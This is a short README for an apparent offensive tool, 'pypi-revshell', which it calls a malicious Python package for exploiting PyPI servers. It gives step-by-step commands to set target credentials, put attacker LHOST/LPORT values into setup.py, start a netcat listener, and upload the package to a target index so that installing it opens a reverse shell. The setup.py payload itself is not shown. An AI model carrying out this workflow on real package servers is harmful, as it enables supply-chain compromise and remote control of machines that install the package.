# pypi-revshell
Malicious Python package for PyPi server exploitation

## Create `~/.pypirc` with the target PyPi creds
https://pypi.org/project/pypiserver/#upload-with-setuptools

## Using setuptools:
```bash
git clone https://github.com/iamkashz/pypi-revshell.git
cd pypi-revshell
# modify LHOST, LPORT in setup.py

# to confirm package creation
python setup.py sdist
# should create tar archive under dist/pypi-revshell-0.1.tar.gz

# start listener using 
nc -lvnp LPORT

# uplood package to target
python setup.py sdist upload -r [remote-index-server]
```

## References
https://pypi.org/project/pypiserver/
https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/
